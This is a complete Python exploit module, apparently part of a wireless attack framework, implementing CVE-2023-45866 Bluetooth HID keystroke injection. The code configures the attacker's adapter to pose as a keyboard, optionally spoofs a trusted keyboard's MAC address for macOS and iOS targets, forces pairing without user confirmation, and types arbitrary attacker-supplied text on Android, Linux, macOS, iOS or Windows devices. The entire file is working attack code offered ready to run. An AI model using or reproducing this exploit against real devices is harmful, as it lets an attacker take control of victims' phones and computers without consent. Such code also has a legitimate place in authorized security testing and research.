#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""Native Bluetooth HID Keystroke Injection (CVE-2023-45866).

Unauthenticated keystroke injection via Bluetooth HID. Exploits SSP "Just
Works" pairing when the attacker declares NoInputNoOutput IO capability,
allowing injection of arbitrary keystrokes without user confirmation.

Supports: Android, Linux, macOS (with spoofed MAC), iOS, Windows.
Requires: Linux with BlueZ, pybluez, pydbus, bdaddr (for MAC spoofing).

Version: 1.0.0
"""

from __future__ import annotations

import enum
import logging
import os
import shutil
import struct
import subprocess
import threading
import time
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from wirelessxpl.core.exploit import *

logger = logging.getLogger(__name__)

try:
    import bluetooth
    HAS_PYBLUEZ = True
except ImportError:
    HAS_PYBLUEZ = False

try:
    import dbus
    import dbus.service
    from gi.repository import GLib
    HAS_DBUS = True
except ImportError:
    HAS_DBUS = False


# ─── HID Protocol Constants ─────────────────────────────────────────────────
PSM_SDP = 1
PSM_HID_CONTROL = 17
PSM_HID_INTERRUPT = 19

BT_CLASS_KEYBOARD = 0x002540

HID_HEADER_DATA_INPUT = 0xA1
HID_REPORT_ID_KEYBOARD = 0x01


class Mod(enum.IntFlag):
    """HID keyboard modifier flags."""
    NONE = 0x00
    LEFT_CTRL = 0x01
    LEFT_SHIFT = 0x02
    LEFT_ALT = 0x04
    LEFT_META = 0x08
    RIGHT_CTRL = 0x10
    RIGHT_SHIFT = 0x20
    RIGHT_ALT = 0x40
    RIGHT_META = 0x80


class Key(enum.IntEnum):
    """HID keyboard usage codes (USB HID Usage Table 0x07)."""
    NONE = 0x00
    A = 0x04; B = 0x05; C = 0x06; D = 0x07; E = 0x08; F = 0x09
    G = 0x0A; H = 0x0B; I = 0x0C; J = 0x0D; K = 0x0E; L = 0x0F
    M = 0x10; N = 0x11; O = 0x12; P = 0x13; Q = 0x14; R = 0x15
    S = 0x16; T = 0x17; U = 0x18; V = 0x19; W = 0x1A; X = 0x1B
    Y = 0x1C; Z = 0x1D
    N1 = 0x1E; N2 = 0x1F; N3 = 0x20; N4 = 0x21; N5 = 0x22
    N6 = 0x23; N7 = 0x24; N8 = 0x25; N9 = 0x26; N0 = 0x27
    ENTER = 0x28; ESCAPE = 0x29; BACKSPACE = 0x2A; TAB = 0x2B
    SPACE = 0x2C; MINUS = 0x2D; EQUAL = 0x2E; LBRACKET = 0x2F
    RBRACKET = 0x30; BACKSLASH = 0x31; SEMICOLON = 0x33
    APOSTROPHE = 0x34; GRAVE = 0x35; COMMA = 0x36; PERIOD = 0x37
    SLASH = 0x38; CAPSLOCK = 0x39
    F1 = 0x3A; F2 = 0x3B; F3 = 0x3C; F4 = 0x3D; F5 = 0x3E
    F6 = 0x3F; F7 = 0x40; F8 = 0x41; F9 = 0x42; F10 = 0x43
    F11 = 0x44; F12 = 0x45
    RIGHT_ARROW = 0x4F; LEFT_ARROW = 0x50
    DOWN_ARROW = 0x51; UP_ARROW = 0x52


_ASCII_TO_HID: Dict[str, Tuple] = {}


def _init_ascii_map() -> None:
    """Build ASCII character to HID keycode mapping."""
    global _ASCII_TO_HID
    lowercase = "abcdefghijklmnopqrstuvwxyz"
    for i, ch in enumerate(lowercase):
        _ASCII_TO_HID[ch] = (Key(0x04 + i),)
        _ASCII_TO_HID[ch.upper()] = (Key(0x04 + i), Mod.LEFT_SHIFT)

    digits = "1234567890"
    for i, ch in enumerate(digits):
        _ASCII_TO_HID[ch] = (Key(0x1E + i),)

    shifted_digits = {
        "!": Key.N1, "@": Key.N2, "#": Key.N3, "$": Key.N4, "%": Key.N5,
        "^": Key.N6, "&": Key.N7, "*": Key.N8, "(": Key.N9, ")": Key.N0,
    }
    for ch, key in shifted_digits.items():
        _ASCII_TO_HID[ch] = (key, Mod.LEFT_SHIFT)

    simple_map = {
        " ": (Key.SPACE,), "\n": (Key.ENTER,), "\t": (Key.TAB,),
        "-": (Key.MINUS,), "=": (Key.EQUAL,), "[": (Key.LBRACKET,),
        "]": (Key.RBRACKET,), "\\": (Key.BACKSLASH,), ";": (Key.SEMICOLON,),
        "'": (Key.APOSTROPHE,), "`": (Key.GRAVE,), ",": (Key.COMMA,),
        ".": (Key.PERIOD,), "/": (Key.SLASH,),
    }
    _ASCII_TO_HID.update(simple_map)

    shifted_symbols = {
        "_": Key.MINUS, "+": Key.EQUAL, "{": Key.LBRACKET,
        "}": Key.RBRACKET, "|": Key.BACKSLASH, ":": Key.SEMICOLON,
        '"': Key.APOSTROPHE, "~": Key.GRAVE, "<": Key.COMMA,
        ">": Key.PERIOD, "?": Key.SLASH,
    }
    for ch, key in shifted_symbols.items():
        _ASCII_TO_HID[ch] = (key, Mod.LEFT_SHIFT)


_init_ascii_map()


def keyboard_report(keys: List[Key] = None, modifiers: Mod = Mod.NONE) -> bytes:
    """Build an 11-byte HID keyboard input report.

    Format: [0xA1, 0x01, modifiers, 0x00, key1, key2, ..., key7]
    """
    keycodes = [k.value for k in (keys or [])][:7]
    keycodes += [0] * (7 - len(keycodes))
    return bytes([HID_HEADER_DATA_INPUT, HID_REPORT_ID_KEYBOARD,
                  int(modifiers), 0x00] + keycodes)


def empty_report() -> bytes:
    """Build a key-release report (all zeros)."""
    return keyboard_report()


def string_to_reports(text: str) -> List[Tuple[bytes, bytes]]:
    """Convert a string to a list of (press, release) HID report pairs."""
    reports = []
    for ch in text:
        entry = _ASCII_TO_HID.get(ch)
        if entry is None:
            logger.warning("Unmapped character: %r", ch)
            continue
        if len(entry) == 2:
            key, mod = entry
            press = keyboard_report([key], mod)
        else:
            press = keyboard_report([entry[0]])
        reports.append((press, empty_report()))
    return reports


class L2CAPSocket:
    """Thin wrapper around a Bluetooth L2CAP socket."""

    def __init__(self, target: str, psm: int) -> None:
        self.target = target
        self.psm = psm
        self.sock: Optional[bluetooth.BluetoothSocket] = None

    def connect(self, timeout: float = 5.0) -> None:
        """Establish L2CAP connection."""
        self.sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        self.sock.settimeout(timeout)
        self.sock.connect((self.target, self.psm))
        self.sock.setblocking(False)

    def send(self, data: bytes) -> None:
        """Send data on L2CAP channel."""
        if self.sock:
            self.sock.send(data)

    def recv(self, bufsize: int = 1024) -> Optional[bytes]:
        """Non-blocking receive."""
        if not self.sock:
            return None
        try:
            return self.sock.recv(bufsize)
        except Exception:
            return None

    def close(self) -> None:
        """Close L2CAP connection."""
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None


class HIDKeyboardClient:
    """Manages HID keyboard connections and keystroke injection."""

    def __init__(self, target: str) -> None:
        self.target = target
        self.sdp = L2CAPSocket(target, PSM_SDP)
        self.ctrl = L2CAPSocket(target, PSM_HID_CONTROL)
        self.intr = L2CAPSocket(target, PSM_HID_INTERRUPT)
        self.hid_ready = False
        self._exit = threading.Event()
        self._ack_thread: Optional[threading.Thread] = None

    def connect(self, timeout: float = 5.0) -> bool:
        """Establish SDP + HID Control + HID Interrupt connections."""
        try:
            logger.info("Connecting SDP (PSM %d)...", PSM_SDP)
            self.sdp.connect(timeout)

            logger.info("Connecting HID Control (PSM %d)...", PSM_HID_CONTROL)
            self.ctrl.connect(timeout)

            logger.info("Connecting HID Interrupt (PSM %d)...", PSM_HID_INTERRUPT)
            self.intr.connect(timeout)

            self._ack_thread = threading.Thread(target=self._ack_loop, daemon=True)
            self._ack_thread.start()

            return True
        except Exception as err:
            logger.error("HID connection failed: %s", err)
            return False

    def _ack_loop(self) -> None:
        """Auto-acknowledge HID Control messages."""
        while not self._exit.is_set():
            raw = self.intr.recv()
            if raw in (b"\xa2\xf1\x01\x00", b"\xa2\x01\x01"):
                self.hid_ready = True

            raw = self.ctrl.recv()
            if raw is not None:
                if raw == b"\x15":
                    logger.warning("Host rejected HID connection (0x15)")
                    self.ctrl.close()
                    break
                self.ctrl.send(b"\x00")

            self.sdp.recv()
            time.sleep(0.01)

    def wait_ready(self, timeout: float = 10.0) -> bool:
        """Wait until HID channel is ready."""
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            if self.hid_ready:
                return True
            time.sleep(0.1)
        return self.hid_ready

    def send_keypress(self, keys: List[Key] = None,
                      modifiers: Mod = Mod.NONE,
                      delay: float = 0.004) -> None:
        """Send a single keypress (down + up)."""
        self.intr.send(keyboard_report(keys, modifiers))
        time.sleep(delay)
        self.intr.send(empty_report())
        time.sleep(delay)

    def type_string(self, text: str, delay: float = 0.02) -> None:
        """Type a string character by character."""
        for press, release in string_to_reports(text):
            self.intr.send(press)
            time.sleep(delay / 2)
            self.intr.send(release)
            time.sleep(delay / 2)

    def close(self) -> None:
        """Close all connections."""
        self._exit.set()
        self.sdp.close()
        self.ctrl.close()
        self.intr.close()


def _configure_adapter(hci: str, name: str = "WXF Keyboard",
                       spoof_mac: str = "") -> None:
    """Configure Bluetooth adapter for HID keyboard impersonation."""
    try:
        subprocess.run(
            ["sudo", "hciconfig", hci, "up"], check=True,
            capture_output=True, timeout=5,
        )
        subprocess.run(
            ["sudo", "hciconfig", hci, "name", name], check=True,
            capture_output=True, timeout=5,
        )
        subprocess.run(
            ["sudo", "hciconfig", hci, "class", "0x{:06x}".format(BT_CLASS_KEYBOARD)],
            check=True, capture_output=True, timeout=5,
        )
        subprocess.run(
            ["sudo", "btmgmt", "--index", hci.replace("hci", ""), "io-cap", "1"],
            check=True, capture_output=True, timeout=5,
        )
        subprocess.run(
            ["sudo", "btmgmt", "--index", hci.replace("hci", ""), "ssp", "1"],
            check=True, capture_output=True, timeout=5,
        )
    except Exception as err:
        logger.error("Adapter configuration failed: %s", err)

    if spoof_mac and shutil.which("bdaddr"):
        try:
            subprocess.run(
                ["sudo", "bdaddr", "-i", hci, spoof_mac],
                check=True, capture_output=True, timeout=5,
            )
            subprocess.run(
                ["sudo", "hciconfig", hci, "reset"],
                check=True, capture_output=True, timeout=5,
            )
            logger.info("Spoofed MAC to %s", spoof_mac)
        except Exception as err:
            logger.warning("MAC spoof failed: %s", err)


class Exploit(Exploit):
    """Native BT HID keystroke injection — CVE-2023-45866."""

    __info__ = {
        "name": "BT HID Keystroke Injection (CVE-2023-45866)",
        "description": (
            "Unauthenticated Bluetooth HID keystroke injection. Registers as "
            "a keyboard via SDP, forces Just Works SSP pairing, then injects "
            "arbitrary keystrokes. Targets Android, Linux, macOS, iOS, Windows. "
            "Native implementation — no external PoC scripts required."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "Original research: Marc Newlin / SkySafe (2023)",
        ),
        "references": (
            "https://github.com/marcnewlin/hi_my_name_is_keyboard",
            "https://www.bluetooth.com/learn-about-bluetooth/key-attributes/bluetooth-security/reporting-security/",
        ),
        "devices": ("bluetooth", "bluetooth_classic"),
    }

    target_address = OptMAC("", "Target Bluetooth MAC address")
    target_os = OptString(
        "android",
        "Target OS: android | linux | macos | ios | windows",
    )
    payload_text = OptString(
        "",
        "Text string to type on the target (leave empty for Tab injection demo)",
    )
    hci_device = OptString("hci0", "Local Bluetooth adapter")
    spoof_mac = OptString(
        "",
        "MAC address to spoof (required for macOS/iOS — use Magic Keyboard MAC)",
    )
    connect_timeout = OptFloat(10.0, "L2CAP connection timeout (seconds)")
    key_delay = OptFloat(0.02, "Delay between keystrokes (seconds)")
    dry_run = OptBool(False, "Show configuration without executing")

    def _inject_demo_tabs(self, client: HIDKeyboardClient, duration: float = 5.0) -> None:
        """Inject Tab keystrokes for demonstration."""
        end_time = time.monotonic() + duration
        count = 0
        while time.monotonic() < end_time:
            client.send_keypress([Key.TAB])
            count += 1
            time.sleep(0.1)
        logger.info("Injected %d Tab keystrokes", count)

    def run(self) -> None:
        """Execute BT HID keystroke injection."""
        if not HAS_PYBLUEZ:
            print_error("pybluez is required. Install: pip install pybluez")
            return

        if not self.target_address:
            print_error("target_address is required.")
            return

        if self.dry_run:
            print_info("BT HID Injection Configuration:")
            print_info("  Target:      {}".format(self.target_address))
            print_info("  Target OS:   {}".format(self.target_os))
            print_info("  HCI device:  {}".format(self.hci_device))
            print_info("  Spoof MAC:   {}".format(self.spoof_mac or "(none)"))
            print_info("  Payload:     {}".format(
                repr(self.payload_text[:50]) if self.payload_text else "(Tab demo)"))
            return

        if self.target_os in ("macos", "ios") and not self.spoof_mac:
            print_error("spoof_mac is required for macOS/iOS targets.")
            return

        print_status("Configuring adapter {}...".format(self.hci_device))
        _configure_adapter(self.hci_device, spoof_mac=self.spoof_mac)

        print_status("Connecting to {} ({})...".format(
            self.target_address, self.target_os))

        client = HIDKeyboardClient(self.target_address)
        if not client.connect(self.connect_timeout):
            print_error("Failed to establish HID connections.")
            return

        print_status("Waiting for HID channel readiness...")
        if self.target_os in ("macos", "ios"):
            if not client.wait_ready(30.0):
                print_info("HID ready signal not received — attempting injection anyway.")
        else:
            time.sleep(2.0)
            client.hid_ready = True

        print_success("Connected. Injecting keystrokes...")

        try:
            if self.payload_text:
                client.type_string(self.payload_text, self.key_delay)
                print_success("Typed {} characters.".format(len(self.payload_text)))
            else:
                print_info("No payload_text set — running Tab injection demo (5s).")
                self._inject_demo_tabs(client, 5.0)
                print_success("Tab demo complete.")
        except KeyboardInterrupt:
            print_info("\nInjection interrupted by user.")
        finally:
            client.close()

        print_success("BT HID injection finished against {}.".format(self.target_address))
